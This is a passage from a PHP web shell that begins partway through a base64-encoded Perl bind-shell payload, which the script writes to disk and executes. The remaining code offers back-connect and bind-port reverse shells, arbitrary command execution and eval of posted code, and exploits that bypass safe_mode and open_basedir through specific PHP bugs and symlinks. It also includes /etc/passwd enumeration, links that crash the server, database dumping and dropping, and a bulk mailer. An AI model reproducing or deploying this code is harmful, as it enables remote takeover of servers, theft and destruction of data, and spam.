U09DS19TVFJFQU0sICRwcm90byk7c2V0c29ja29wdChTRVJWRVIsIFNPTF9TT0NLRVQsIFNPX1JF
VVNFQUREUiwgcGFjaygibCIsIDEpKTtiaW5kKFNFUlZFUiwgc29ja2FkZHJfaW4oJHBvcnQsIElO
QUREUl9BTlkpKTtsaXN0ZW4oU0VSVkVSLCBTT01BWENPTk4pO2Zvcig7ICRwYWRkciA9IGFjY2Vw
dChDTElFTlQsIFNFUlZFUik7IGNsb3NlIENMSUVOVCl7b3BlbihTVERJTiwgIj4mQ0xJRU5UIik7
b3BlbihTVERPVVQsICI+JkNMSUVOVCIpO29wZW4oU1RERVJSLCAiPiZDTElFTlQiKTtzeXN0ZW0o
Jy9iaW4vc2gnKTtjbG9zZShTVERJTik7Y2xvc2UoU1RET1VUKTtjbG9zZShTVERFUlIpO30g";
$oplb=fopen("lbp.pl","w");
fwrite($oplb,base64_decode($lbp));
fclose($oplb);
system("perl lbp.pl $wb") or die("I Can Not Execute Command For Back Connect Disable_functions Or Safe Mode");
}

if($_REQUEST['portbw']){
wbp($_REQUEST['portbw']);

}if($_REQUEST['portbl']){
lbp($_REQUEST['portbl']);
}
if($_REQUEST['ipcb'] && $_REQUEST['portbc']){
bcn($_REQUEST['ipcb'],$_REQUEST['portbc']);

}

if($_REQUEST['do']=="bc"){
echo $head.$formp."<p align='center'>Usage : Run Netcat In Your Machin And Execute This Command( Disable Firewall !!! )<br><hr><p align='center'><<<<<< Back Connect >>>>>><br>Ip Address : <input name=ipcb value=".$_SERVER['REMOTE_ADDR'] ."> Port : <input name=portbc value=5555><br><input type=submit value=Connect></form>".$formp."<p align='center'>Usage : Run Netcat In Your Machin And Execute This Command( Disable Firewall !!! )<br><hr><p align='center'><<<<<< Windows Bind Port >>>>>><br>Port : <input name=portbw value=5555><br><input type=submit value=Connect></form>".$formp."<p align='center'>Usage : Run Netcat In Your Machin And Execute This Command( Disable Firewall !!! )<br><hr><p align='center'><<<<<< Linux Bind Port >>>>>><br>Port : <input name=portbl value=5555><br><input type=submit value=Connect></form>".$end;exit;

}
function copyf($file1,$file2,$filename){
global $slash;
$fpc = fopen($file1, "rb");
$source = '';
while (!feof($fpc)) {
$source .= fread($fpc, 8192);
}
fclose($fpc);
$opt = fopen($file2.$slash.$filename, "w");
fwrite($opt, $source);
fclose($opt);
}
if ($_REQUEST['copyname'] && $_REQUEST['cpyto']){
if(is_writable($_REQUEST['cpyto'])){
echo $_REQUEST['address'];
copyf($_REQUEST['address'].$slash.$_REQUEST['copyname'],$_REQUEST['cpyto'],$_REQUEST['copyname']);
}else{alert("Permission Denied !");}}
if($_REQUEST['cfilename']){

echo $head.$formp.$nowaddress.'<p align="center"><b>Create File</b><br><textarea rows="19" name="nf4cs" cols="87"></textarea><br><input value="'.$_REQUEST['cfilename'].'" name=nf4c size=50><br><input type=submit value="  Create  "></form>'.$end;exit;
}

if($_REQUEST['nf4c'] && $_REQUEST['nf4cs']){
if($ofile4c=fopen($_REQUEST['nf4c'],"w")){
fwrite($ofile4c,$_REQUEST['nf4cs']);
fclose($ofile4c);
alert("File Saved !");}else{alert("Permission Denied !");}}

function sqlclienT(){
global $t,$errorbox,$et,$hcwd;
if(!empty($_REQUEST['serveR']) && !empty($_REQUEST['useR']) && isset($_REQUEST['pasS']) && !empty($_REQUEST['querY'])){
$server=$_REQUEST['serveR'];$type=$_REQUEST['typE'];$pass=$_REQUEST['pasS'];$user=$_REQUEST['useR'];$query=$_REQUEST['querY'];
$db=(empty($_REQUEST['dB']))?'':$_REQUEST['dB'];
$_SESSION[server]=$_REQUEST['serveR'];$_SESSION[type]=$_REQUEST['typE'];$_SESSION[pass]=$_REQUEST['pasS'];$_SESSION[user]=$_REQUEST['useR'];

}

if (isset ($_GET[select_db])){
	$getdb=$_GET[select_db];
	$_SESSION[db]=$getdb;
	$query="SHOW TABLES";
	$res=querY($_SESSION[type],$_SESSION[server],$_SESSION[user],$_SESSION[pass],$_SESSION[db],$query);
}
elseif (isset ($_GET[select_tbl])){
	$tbl=$_GET[select_tbl];
	$_SESSION[tbl]=$tbl;
	$query="SELECT * FROM `$tbl`";
	$res=querY($_SESSION[type],$_SESSION[server],$_SESSION[user],$_SESSION[pass],$_SESSION[db],$query);
}
elseif (isset ($_GET[drop_db])){
	$getdb=$_GET[drop_db];
	$_SESSION[db]=$getdb;
	$query="DROP DATABASE `$getdb`";
	querY($_SESSION[type],$_SESSION[server],$_SESSION[user],$_SESSION[pass],'',$query);
	$res=querY($_SESSION[type],$_SESSION[server],$_SESSION[user],$_SESSION[pass],'','SHOW DATABASES');
}
elseif (isset ($_GET[drop_tbl])){
	$getbl=$_GET[drop_tbl];
	$query="DROP TABLE `$getbl`";
	querY($_SESSION[type],$_SESSION[server],$_SESSION[user],$_SESSION[pass],$_SESSION[db],$query);
	$res=querY($_SESSION[type],$_SESSION[server],$_SESSION[user],$_SESSION[pass],$_SESSION[db],'SHOW TABLES');
}
elseif (isset ($_GET[drop_row])){
	$getrow=$_GET[drop_row];
	$getclm=$_GET[clm];
	$query="DELETE FROM `$_SESSION[tbl]` WHERE $getclm='$getrow'";
	$tbl=$_SESSION[tbl];
	querY($_SESSION[type],$_SESSION[server],$_SESSION[user],$_SESSION[pass],$_SESSION[db],$query);
	$res=querY($_SESSION[type],$_SESSION[server],$_SESSION[user],$_SESSION[pass],$_SESSION[db],"SELECT * FROM `$tbl`");
}
else
	$res=querY($type,$server,$user,$pass,$db,$query);

if($res){
$res=htmlspecialchars($res);
$row=array ();
$title=explode('[+][+][+]',$res);
$trow=explode('[-][-][-]',$title[1]);
$row=explode('|+|+|+|+|+|',$title[0]);
$data=array();
$field=$trow[count($trow)-2];
if (strstr($trow[0],'Database')!='')
	$obj='db';
elseif (substr($trow[0],0,6)=='Tables')
	$obj='tbl';
else
	$obj='row';
$i=0;
foreach ($row as $a){
if($a!='')
$data[$i++]=explode('|-|-|-|-|-|',$a);
}

echo "<table border=1 bordercolor='#C6C6C6' cellpadding='2' bgcolor='EAEAEA' width='100%' style='border-collapse: collapse'><tr>";
foreach ($trow as $ti)
echo "<td bgcolor='F2F2F2'>$ti</td>";
echo "</tr>";
$j=0;
while ($data[$j]){
	echo "<tr>";
	foreach ($data[$j++] as $dr){
		echo "<td>";
		if($obj!='row') echo "<a href='$_SERVER[PHP_SELF]?do=db&select_$obj=$dr'>";
		echo $dr;
		if($obj!='row') echo "</a>";
		echo "</td>";
	}
	echo "<td><a href='$_SERVER[PHP_SELF]?do=db&drop_$obj=$dr";
	if($obj=='row')
		echo "&clm=$field";
	echo "'>Drop</a></td></tr>";
}
echo "</table><br>";

}



	

if(empty($_REQUEST['typE']))$_REQUEST['typE']='';
echo "<center><form name=client method='POST' action='$_SERVER[PHP_SELF]?do=db'><table border='1' width='400' style='border-collapse: collapse' id='table1' bordercolor='#C6C6C6' cellpadding='2'><tr><td width='400' colspan='2' bgcolor='#F2F2F2'><p align='center'><b><font face='Arial' size='2' color='#433934'>Connect to Database</font></b></td></tr><tr><td width='150' bgcolor='#EAEAEA'><font face='Arial' size='2'>DB Type:</font></td><td width='250' bgcolor='#EAEAEA'><select name=typE><option valut=MySQL  onClick='document.client.serveR.disabled = false;' ";
if ($_REQUEST['typE']=='MySQL')echo 'selected';
echo ">MySQL</option><option valut=MSSQL onClick='document.client.serveR.disabled = false;' ";
if ($_REQUEST['typE']=='MSSQL')echo 'selected';
echo ">MSSQL</option><option valut=Oracle onClick='document.client.serveR.disabled = true;' ";
if ($_REQUEST['typE']=='Oracle')echo 'selected';
echo ">Oracle</option><option valut=PostgreSQL onClick='document.client.serveR.disabled = false;' ";
if ($_REQUEST['typE']=='PostgreSQL')echo 'selected';
echo ">PostgreSQL</option><option valut=DB2 onClick='document.client.serveR.disabled = false;' ";
if ($_REQUEST['typE']=='DB2')echo 'selected';
echo ">IBM DB2</option></select></td></tr><tr><td width='150' bgcolor='#EAEAEA'><font face='Arial' size='2'>Server Address:</font></td><td width='250' bgcolor='#EAEAEA'><input type=text value='";
if (!empty($_REQUEST['serveR'])) echo htmlspecialchars($_REQUEST['serveR']);else echo 'localhost'; 
echo "' name=serveR size=35></td></tr><tr><td width='150' bgcolor='#EAEAEA'><font face='Arial' size='2'>Username:</font></td><td width='250' bgcolor='#EAEAEA'><input type=text name=useR value='";
if (!empty($_REQUEST['useR'])) echo htmlspecialchars($_REQUEST['useR']);else echo 'root'; 
echo "' size=35></td></tr><tr><td width='150' bgcolor='#EAEAEA'><font face='Arial' size='2'>Password:</font></td><td width='250' bgcolor='#EAEAEA'><input type=text value='";
if (isset($_REQUEST['pasS'])) echo htmlspecialchars($_REQUEST['pasS']);else echo '123'; 
echo "' name=pasS size=35></td></tr><tr><td width='400' colspan='2' bgcolor='#F2F2F2'><p align='center'><b><font face='Arial' size='2' color='#433934'>Submit a Query</font></b></td></tr><tr><td width='150' bgcolor='#EAEAEA'><font face='Arial' size='2'>DB Name:</font></td><td width='250' bgcolor='#EAEAEA'><input type=text value='";
if (!empty($_REQUEST['dB'])) echo htmlspecialchars($_REQUEST['dB']); 
echo "' name=dB size=35></td></tr><tr><td width='150' bgcolor='#EAEAEA'><font face='Arial' size='2'>Query:</font></td><td width='250' bgcolor='#EAEAEA'><textarea name=querY rows=5 cols=27>";
if (!empty($_REQUEST['querY'])) echo htmlspecialchars(($_REQUEST['querY']));else echo 'SHOW DATABASES'; 
echo "</textarea></td></tr><tr><td width='400' colspan='2' bgcolor='#EAEAEA'>$hcwd<input class=buttons type=submit value='Submit' style='float: right'></td></tr></table></form>$et</center>";
}


function querY($type,$host,$user,$pass,$db='',$query){
$res='';
switch($type){
case 'MySQL':
if(!function_exists('mysql_connect'))return 0;
$link=mysql_connect($host,$user,$pass);
if($link){
if(!empty($db))mysql_select_db($db,$link);
$result=mysql_query($query,$link);
if ($result!=1){
while($data=mysql_fetch_row($result))$res.=implode('|-|-|-|-|-|',$data).'|+|+|+|+|+|';
$res.='[+][+][+]';
for($i=0;$i<mysql_num_fields($result);$i++)
$res.=mysql_field_name($result,$i).'[-][-][-]';
}
mysql_close($link);
return $res;
}
break;
case 'MSSQL':
if(!function_exists('mssql_connect'))return 0;
$link=mssql_connect($host,$user,$pass);
if($link){
if(!empty($db))mssql_select_db($db,$link);
$result=mssql_query($query,$link);
while($data=mssql_fetch_row($result))$res.=implode('|-|-|-|-|-|',$data).'|+|+|+|+|+|';
$res.='[+][+][+]';
for($i=0;$i<mssql_num_fields($result);$i++)
$res.=mssql_field_name($result,$i).'[-][-][-]';
mssql_close($link);
return $res;
}
break;
case 'Oracle':
if(!function_exists('ocilogon'))return 0;
$link=ocilogon($user,$pass,$db);
if($link){
$stm=ociparse($link,$query);
ociexecute($stm,OCI_DEFAULT);
while($data=ocifetchinto($stm,$data,OCI_ASSOC+OCI_RETURN_NULLS))$res.=implode('|-|-|-|-|-|',$data).'|+|+|+|+|+|';
$res.='[+][+][+]';
for($i=0;$i<oci_num_fields($stm);$i++)
$res.=oci_field_name($stm,$i).'[-][-][-]';
return $res;
}
break;
case 'PostgreSQL':
if(!function_exists('pg_connect'))return 0;
$link=pg_connect("host=$host dbname=$db user=$user password=$pass");
if($link){
$result=pg_query($link,$query);
while($data=pg_fetch_row($result))$res.=implode('|-|-|-|-|-|',$data).'|+|+|+|+|+|';
$res.='[+][+][+]';
for($i=0;$i<pg_num_fields($result);$i++)
$res.=pg_field_name($result,$i).'[-][-][-]';
pg_close($link);
return $res;
}
break;
case 'DB2':
if(!function_exists('db2_connect'))return 0;
$link=db2_connect($db,$user,$pass);
if($link){
$result=db2_exec($link,$query);
while($data=db2_fetch_row($result))$res.=implode('|-|-|-|-|-|',$data).'|+|+|+|+|+|';
$res.='[+][+][+]';
for($i=0;$i<db2_num_fields($result);$i++)
$res.=db2_field_name($result,$i).'[-][-][-]';
db2_close($link);
return $res;
}
break;
}
return 0;
}
function bywsym($file){
if(!function_exists('symlink')){echo "Function Symlink Not Exist";}

if(!is_writable("."))
	die("not writable directory");
$level=0;
for($as=0;$as<$fakedep;$as++){
	if(!file_exists($fakedir))
		mkdir($fakedir);
	chdir($fakedir);
}
while(1<$as--) chdir("..");
$hardstyle = explode("/", $file);
for($a=0;$a<count($hardstyle);$a++){
	if(!empty($hardstyle[$a])){
		if(!file_exists($hardstyle[$a])) 
			mkdir($hardstyle[$a]);
		chdir($hardstyle[$a]);
		$as++;
}}
$as++;
while($as--)
	chdir("..");
@rmdir("fakesymlink");
@unlink("fakesymlink");
@symlink(str_repeat($fakedir."/",$fakedep),"fakesymlink");
while(1)
	if(true==(@symlink("fakesymlink/".str_repeat("../",$fakedep-1).$file, "symlink".$num))) break;
	else $num++;
@unlink("fakesymlink");
mkdir("fakesymlink");
}
function bypcu($file){
$level=0;

if(!file_exists("file:"))
	mkdir("file:");
chdir("file:");
$level++;

$hardstyle = explode("/", $file);

for($a=0;$a<count($hardstyle);$a++){
	if(!empty($hardstyle[$a])){
		if(!file_exists($hardstyle[$a])) 
			mkdir($hardstyle[$a]);
		chdir($hardstyle[$a]);
		$level++;
	}
}

while($level--) chdir("..");

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, "file:file:///".$file);

echo '<FONT COLOR="RED"> <textarea rows="40" cols="120">';

if(FALSE==curl_exec($ch))
	die('>Sorry... File '.htmlspecialchars($file).' doesnt exists or you dont have permissions.');

echo ' </textarea> </FONT>';

curl_close($ch);
}
if ($_REQUEST['bypcu']){
bypcu($_REQUEST['bypcu']);
}
if($_REQUEST['do']=="bypasscmd"){
if($_POST['bycw']){
echo $_POST['bycw'];
$wsh = new COM('W'.'Scr'.'ip'.'t.she'.'ll');
            $exec = $wsh->exec ("cm"."d.e"."xe /c ".$_POST['bycw']."");
            $stdout = $exec->StdOut();
            $stcom = $stdout->ReadAll();}
			
echo $head.'<p align="center"><textarea rows="13" name="showbsd" cols="77">';if($_POST['byws']){passthru("\\".$_POST['byws']);} echo $stcom.'</textarea><hr><center>Bypass Safe_Mode And Disable_Functions In Windows Server<br><table border="0" width="950" style="border-collapse: collapse" id="table4" cellpadding="5"><tr><td width="200" align="right" valign="top"><font face="Tahoma" style="font-size: 10pt; font-weight:700">'.$formp.'<input type=hidden value="bypasscmd" name=do>Command </font></td><td width="750"><input name=bycw size=50><input type=submit value ="eXecute"></form></td></tr></table>Bypass Safe_Mode Windows Server<br><table border="0" width="950" style="border-collapse: collapse" id="table4" cellpadding="5"><tr><td width="200" align="right" valign="top"><font face="Tahoma" style="font-size: 10pt; font-weight:700">'.$formp.'Command </font></td><td width="750"><input name=byws size=50><input type=submit value ="eXecute"><input type=hidden name=do value="bypasscmd"></form></td></tr></table>'.$end;exit;;
}
if($_REQUEST['do']=="bypassdir"){
if($_POST['byoc']){
if(copy("compress.zlib://".$_POST['byoc'], getcwd()."/"."peji.txt")){
$bopens="Bypass Succesfull Plz Read File Peji.txt In This Folder";
}else{$bopens="Can Not Bypass This";}
}
if($_POST['byfc']){
curl_init("file:///".$_POST['byfc']."\x00/../../../../../../../../../../../../".__FILE__);
$debfc=curl_exec($ch);
}
if($_POST['byetc']){
for($bye=0;$bye<40000;$bye++){
$sbep =$sbep. posix_getpwuid($bye);
}}
if($_POST['byfc9']){
echo "not sucsfull";
}
if($_REQUEST['bysyml']){
$file=$_REQUEST['bysyml'];
bywsym($file);
}
echo $head.'<p align="center"><textarea rows="13" name="showbsd" cols="77">';if($_POST['byws']){passthru("\\".$_POST['byws']);}if(isset($sbep)){for($fbe=0;$fbe<count($sbep);$fbe++){echo $sbep[$fbe];}} if(isset($debfc)){} echo $bopens.'</textarea><hr><center>Bypass Safe_Mode And Open_basedir With Bug Copy(Zlib) Worked In 4.4.2 .. 5.1.2<br><table border="0" width="950" style="border-collapse: collapse" id="table4" cellpadding="5"><tr><td width="200" align="right">'.$formp.'<input type=hidden value="bypassdir" name=do><font face="Tahoma" style="font-size: 10pt; font-weight:700">Address File </font></td><td width="750"><input name=byoc size=50 ><input type=submit value ="read"></form></td></tr></table><hr>Bypass Open_basedir And Read File With Bug Curl Worked In PHP 4.4.2 and 5.1.4<br><table border="0" width="950" style="border-collapse: collapse" id="table4" cellpadding="5"><tr><td width="200" align="right" valign="top"><font face="Tahoma" style="font-size: 10pt; font-weight:700">'.$formp.'Address File </font></td><td width="750"><input name=byfc size=50><input type=submit value ="eXecute"><input type=hidden name=do value="bypassdir"></form></td></tr></table><hr>Bypass Open_basedir And Read File With Bug Curl Worked In PHP 4.X ... 5.2.9<br><table border="0" width="950" style="border-collapse: collapse" id="table4" cellpadding="5"><tr><td width="200" align="right" valign="top"><font face="Tahoma" style="font-size: 10pt; font-weight:700">'.$formp.'Address File </font></td><td width="750"><input name=byfc9 size=50><input type=submit value ="eXecute"><input type=hidden name=do value="bypassdir"></form></td></tr></table><hr>Bypass /Etc/Passwd<br>'.$formp.'<input type=submit value ="Read Passwd"><input type=hidden name=byetc value="lol"><input type=hidden name=do value="bypassdir"></form><hr>Bypass With ini_restore'.$formp.'<input type=submit value ="Read File"><input name=rfili value="Pejijon" type=hidden><input type=hidden name=do value="bypassdir"></form><hr>Bypass With Symlink Worked In 5.x.x 5.2.11 With Bug Symlink<table border="0" width="950" style="border-collapse: collapse" id="table4" cellpadding="5"><tr><td width="200" align="right" valign="top"><font face="Tahoma" style="font-size: 10pt; font-weight:700">'.$formp.'</font></td><td width="750"><input name=bysyml size=50><input type=submit value ="Read File"><input type=hidden name=do value="bypassdir"><input name=rfili value="Pejijon" type=hidden></form></td></tr></table><hr>'.$formp.'Bypass Safe And Open_basedir With Bug Curl Worked In 4.x.x ... 5.2.9<table border="0" width="950" style="border-collapse: collapse" id="table4" cellpadding="5"><tr><td width="200" align="right" valign="top"><font face="Tahoma" style="font-size: 10pt; font-weight:700">'.$formp.'</font></td><td width="750"><input name=bypcu size=50><input type=submit value ="Read File"><input type=hidden name=do value="bypassdir"></form></td></tr></table>'.$end;exit;;




}
function printdrive(){
global $slash;
foreach (range("A","Z") as $tempdrive) {
if (is_dir($tempdrive.":".$slash)){
$adri=$tempdrive.":".$slash;
$drivea=$drivea.'<a href="?address='.$adri.'"><font size=1>'.$tempdrive.':'.$slash.' </a></font>';
}
}
return $drivea;
}
if($_POST['nameren'] && $_POST['addressren']){
if(is_writable($_REQUEST['addressren'])){

rename($_POST['addressren'],$_POST['nameren']);alert("Rename Successful !");
}else{alert("Permission Denied !");}
}
if($_GET['do']=="delete"){

if ($_GET['type']=="dir"){
if(is_writable($_REQUEST['address'])){
$dir=$_GET['address'].$_GET['filename'];
deleteDirectory($dir);
alert("Deleted Successful !");
}else{alert("Permission Denied !");}
}elseif($_GET['type']=="file"){
if(is_writable($_GET['address'].$_GET['filename'])){
unlink($_GET['address'].$_GET['filename']);alert("Deleted Successful !");
}else{alert("Permission Denied !");}
}
}
if($_POST['fedit'] && $_POST['namefe']){
if(is_writable($_REQUEST['address'])){


$opensave=fopen($_POST['address'].$slash.$_POST['namefe'],"w");
fwrite($opensave,html_entity_decode($_POST['fedit']));
fclose($opensave);alert("File Saved Successful !");
}else{alert("Permission Denied !");}
}
if ($_POST['evalsource']){

eval($_POST['evalsource']);
}
if($_GET['do']=="eval"){
echo $head.$formp.$nowaddress.'<p align="center"><textarea rows="19" name="evalsource" cols="87"></textarea><br><input type=submit value="  eXecute  "></form></p>'.$end;exit;
}
if($_GET['do']=="info"){

if(ini_get('register_globals')){
$registerg="Enable";
}else{
$registerg="disable";
}
if(extension_loaded('curl')){
$curls="Enable";
}else{
$curls="disable";
}
if(@function_exists('mysql_connect')){
$db_on = "Mysql : On";
};
if(@function_exists('mssql_connect')){
$db_on = "Mssql : On";
};
if(@function_exists('pg_connect')){
$db_on = "PostgreSQL : On";
};if(@function_exists('ocilogon')){
$db_on = "Oracle : On";
};

echo $head."<font face='Tahoma' size='2'>Operating System : ".php_uname()."<br>Server Name : ".$_SERVER['HTTP_HOST']."<br>Disable_Functions : ".$disablef."<br>Safe_Mode : ".$safe_modes."<br>Openbase_dir : ".ini_get('openbase_dir')."<br>Php Version : ".phpversion()."<br>Free Space : ".sizee(disk_free_space("/"))."<br>Total Space : ".sizee(disk_total_space("/"))."<br>Register_Globals : ".$registerg."<br>Curl : ".$curls."<br>Database ".$db_on."<br>Server Name : ".$_SERVER['HTTP_HOST']."<br>Admin Server : ".$_SERVER['SERVER_ADMIN'].$end;
exit;
}
if ($_GET['do']=="cmd"){
echo $head.'
<form method=get action="'.$me.'">
<p align="center">
<textarea rows="19" name="S1" cols="87">';
if (strlen($_GET['command'])>1 && $_GET['execmethod']!="popen"){
echo $_GET['execmethod']($_GET['command']);}
if (strlen($_POST['command'])>1 && $_POST['execmethod']!="popen"){
echo $_POST['execmethod']($_POST['command']);}

if (strlen($_GET['command'])>1 && $_GET['execmethod']=="popen"){
popen($_GET['command'],"r");}

echo'</textarea></p><p align="center">
<input type=hidden name="do" size="50" value="cmd"> <input type="text" name="command" size="50"><select name=execmethod>
  <option value="system">System</option>  <option value="exec">Exec</option>  <option value="passthru">Passthru</option><option value="popen">popen</option>
</select><input type="submit" value="eXecute">
</p></form>'.$end;exit;}
if ($_GET['do']=="symlink"){
echo $head.'
<form method=post action="'.$me.'">
<p align="center">
SymLink With PHP<br><input name=ad1syp size=50> TO <input value="'.getcwd().$slash."symlink.txt".'" name=ad2syp size=50><br><input type=submit value=SymLink!><hr><p align="center"></form>
<form method=post action="'.$me.'"><p align="center">

SymLink With OS : <br><input name=ad1syc size=50> TO <input value="'.getcwd().$slash."symlink.txt".'" name=ad2syc size=50><br><input type=submit value=SymLink!>
</p></form>'.$end;exit;}
if ($_POST['ad1syp'] && $_POST['ad2syp']){
if (symlink($_POST['ad1syp'],$_POST['ad2syp'])){
alert("Symlink Worked !");
}else{
alert("Symlink Not Worked !");
}}
if ($_POST['ad1syc'] && $_POST['ad2syc']){
if (system('ls -s '.$_POST['ad1syc']." ".$_POST['ad2syc'])){
alert("Symlink Worked !");
}else{alert("Symlink Not Worked !");}
}
if ($_GET['do']=="d0slocal"){
echo $head.'
<p align="center">If You Click This Link This Server Crashed.<br>This Worked In Php 5.3.x : <a href="?dosthisserver=1" target="_blank"><font size=4>Dos This Server I Am Sure </font></a><br>This Worked In Php 4.x.x And 5.2.9 : <a href="?dosthisserver=2" target="_blank"><font size=4>Dos This Server I Am Sure </a>'.$end;exit;}
if ($_GET['dosthisserver']=="1"){
function dosserver(){
$junk=str_repeat("99999999999999999999999999999999999999999999999999",99999);
for($i=0;$i<2;){
$buff=bcpow($junk, '3', 2);
$buff=null;
}
}
dosserver();
}
if ($_GET['dosthisserver']=="2"){
function cx(){cx();}
 cx();
}
if ($_GET['do']=="convert"){
$hash=null;
if ($_GET['stringtoh'] && $_GET['hashtoh']=='md5'){
$hash=md5($_GET['stringtoh']);
}elseif ($_GET['stringtoh'] && $_GET['hashtoh']=='sh1'){
$hash=sha1($_GET['stringtoh']);
}elseif ($_GET['stringtoh'] && $_GET['hashtoh']=='crc32'){
$hash=crc32($_GET['stringtoh']);
}elseif ($_GET['stringtoh'] && $_GET['hashtoh']=='b64e'){
$hash=base64_encode($_GET['stringtoh']);
}elseif ($_GET['stringtoh'] && $_GET['hashtoh']=='b64d'){
$hash=base64_decode($_GET['stringtoh']);
}
echo $head.'
<form method=get action="'.$me.'">
<p align="center">Convert<br><input type=hidden name=do value=convert>
<input name=stringtoh size=58><select name=hashtoh>
<option value="md5">MD5</option>
<option value="crc32">CRC32</option>
<option value="sha1">SHA1</option>
<option value="b64e">Base64 Encode!</option>
<option value="b64d">Base64 Decode!</option>
<br><textarea cols=60 rows=18>'.$hash.'</textarea><br><input type=submit value="Convert">

</p></form>'.$end;exit;}
if ($_GET['do']=="dump"){
echo $head.'<p align="center">';
echo '<table border=1 width=400 style="border-collapse: collapse"  bordercolor=#C6C6C6 cellpadding=2><tr><td width=400 colspan=2 bgcolor=#F2F2F2><p align=center><b><font face=Arial size=2 color=#433934>Backup Database</font></b></td></tr><tr><td width=150 bgcolor=#EAEAEA><font face=Arial size=2>DB Type:</font></td><td width=250 bgcolor=#EAEAEA><form method=post action="'.$me.'"><select name=method><option value="gzip">Gzip</option><option value="sql">Sql</option> </select></td></tr><tr><td width=150 bgcolor=#EAEAEA><font face=Arial size=2>Server:</font></td><td width=250 bgcolor=#EAEAEA><input type=text name=server size=35></td></tr><tr><td width=150 bgcolor=#EAEAEA><font face=Arial size=2>Username:</font></td><td width=250 bgcolor=#EAEAEA><input type=text name=username size=35></td></tr><tr><td width=150 bgcolor=#EAEAEA><font face=Arial size=2>Password:</font></td><td width=250 bgcolor=#EAEAEA><input type=text name=password></td></tr><tr><td width=150 bgcolor=#EAEAEA><font face=Arial size=2>Data Base Name:</font></td><td width=250 bgcolor=#EAEAEA><input type=text name=dbname></td></tr><tr><td width=400 colspan=2 bgcolor=#EAEAEA><center><input type=submit value="  Dump!  " ></td></tr></table></form></center></table>'.$end;exit;}
if ($_POST['username'] && $_POST['dbname'] && $_POST['method']){
$date = date("Y-m-d");
$dbserver = $_POST['server'];
$dbuser = $_POST['username'];
$dbpass = $_POST['password'];
$dbname = $_POST['dbname'];
$file = "Dump-$dbname-$date";
$method = $_POST['method'];
if ($method=='sql'){
$file="Dump-$dbname-$date.sql";
$fp=fopen($file,"w");
}else{
$file="Dump-$dbname-$date.sql.gz";
$fp = gzopen($file,"w");
}
function write($data) {
global $fp;
if ($_POST['method']=='sql'){
fwrite($fp,$data);
}else{
gzwrite($fp, $data);
}}
mysql_connect ($dbserver, $dbuser, $dbpass);
mysql_select_db($dbname);
$tables = mysql_query ("SHOW TABLES");
while ($i = mysql_fetch_array($tables)) {
    $i = $i['Tables_in_'.$dbname];
    $create = mysql_fetch_array(mysql_query ("SHOW CREATE TABLE ".$i));
    write($create['Create Table'].";\n\n");
    $sql = mysql_query ("SELECT * FROM ".$i);
    if (mysql_num_rows($sql)) {
        while ($row = mysql_fetch_row($sql)) {
            foreach ($row as $j => $k) {
                $row[$j] = "'".mysql_escape_string($k)."'";
            }
            write("INSERT INTO $i VALUES(".implode(",", $row).");\n");
        }
    }
}
if ($method=='sql'){
fclose ($fp);
}else{
gzclose($fp);}
header("Content-Disposition: attachment; filename=" . $file);   
header("Content-Type: application/download");
header("Content-Length: " . filesize($file));
flush();

$fp = fopen($file, "r");
while (!feof($fp))
{
    echo fread($fp, 65536);
    flush();
} 
fclose($fp); 
}

if ($_GET['do']=="mail"){
echo $head.'
<form method=post action="'.$me.'">
<p align="center">
Address : <input type="text" name="admail" size="50"><br><br>Subject : <input type="text" name="submail" size="50"><br><br><textarea cols=70 rows=18 name=textmail>Text</textarea><br><br>Number For Send : <input type="text" name="numail" size="5" value=1><input type=submit value=Send!></form>'.$end;exit;}
if ($_POST['admail'] && $_POST['submail'] ){
for($mi=0;$mi<intval($_POST['numail']);$mi++){
mail($_POST['admail'], $_POST['submail'], $_POST['textmail']);}
}
if($_GET['do']=="db"){
echo $head;sqlclienT();echo $end;
exit;
}
if($_REQUEST['file2ch'] && $_REQUEST['chmodnow']){
$chmodnum2=$_REQUEST['chmodnow'];
chmod($_REQUEST['file2ch'],"0".$chmodnum2);
}
if($_GET['do']=="chmod"){
echo $head.$formg.$nowaddress."<p align=center><b>Chmod</b><br><input size=50 name=file2ch value='".$_REQUEST['address'].$_REQUEST['filename']."'> To  <input name=chmodnow size=1 value=777><br><input type=submit value=Set></form>".$end;exit;

}
/* if($_GET['do']=="edit"){
if($_GET['filename']=="dir"){
if(is_readable($_GET['address'])){
chdir($_GET['address']);}else{alert("Permission Denied !");}

}} */
$araddresss=explode($slash,getcwd());
$matharrayy=count($araddresss)-1;
$addr1backk=str_replace($araddresss[$matharrayy],"",$araddresss);
for($countback=0;$countback<count($addr1backk);$countback++){
$arraybacke[$countback]=$slash.$addr1backk[$countback];
$backdirunixx=$backdirunixx.$slash.$addr1backk[$countback];
}
if ($slash=="\\"){
$countback=null;
$backdirwin=null;
for($countback=1;$countback<count($addr1backk);$countback++){
$backdirwin=$backdirwin."\\".$addr1backk[$countback];}
$backdirwin=$addr1backk[0].$backdirwin;
$backaddresss=$backdirwin;
}else{
$countback=null;
$backdirwin=null;
for($countback=1;$countback<count($addr1backk);$countback++){
$backdirwin=$backdirwin."/".$addr1backk[$countback];}
$backdirwin=$addr1backk[0].$backdirwin;
$backaddresss=$backdirwin;
$backaddresss=str_replace("\\","/",$backaddresss);
}
function calc_dir_size($path)
{
$size = 0;
if ($handle = opendir($path))
{
while (false !== ($entry = readdir($handle)))
{
$current_path = $path . '/' . $entry;
if ($entry != '.' && $entry != '..' && !is_link($current_path))
{
if (is_file($current_path))
$size += filesize($current_path);
elseif (is_dir($current_path))
$size = calc_dir_size($current_path);
}
}
}
closedir($handle);
return $size;
} 
function openf($parsef){
global $basep,$slash;

if(strlen(strpos(getcwd(),$basep))>=1){
$rr=str_replace($basep,"",getcwd());
$rr=str_replace("\\","/",$rr);
$diropen='<a href="'.$rr."/".$parsef.'">'.$parsef.'</a>';
}else{
$diropen='<a href="?do=edit&address='.getcwd().$slash.'&filename='.$parsef.'">'.$parsef.'</a>';
}
return $diropen;
}
if ($_GET['address']){$ifget=$_GET['address'];}if($_POST['address']){$ifget=$_POST['address'];}
if($cwd==''){$cwd=getcwd();}$nowaddress='<input type=hidden name=address value="'.$cwd.'">';
$ad=getcwd();
$hand=opendir("$ad");
$coi=0;
$coi2=0;

while (false !== ($fileee = readdir($hand))) {


        if ($fileee != "." && $fileee != "..") {
		if (filetype($fileee)=="dir"){
		if ($coi %2){
$colort='"#e7e3de"';
}else{
$colort='"#e4e1de"';

}
$coi++;
